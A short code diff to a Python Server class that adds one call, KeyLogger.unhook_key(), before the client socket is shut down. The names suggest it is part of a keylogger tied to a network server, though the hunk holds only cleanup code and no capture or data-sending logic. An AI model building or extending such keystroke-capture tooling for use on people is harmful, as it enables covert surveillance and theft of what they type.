@@ -103,6 +103,7 @@ class Server:
                 break
                 
         if self.client:
+            KeyLogger.unhook_key()
             self.client.shutdown(socket.SHUT_RDWR)
             self.client.close()
 
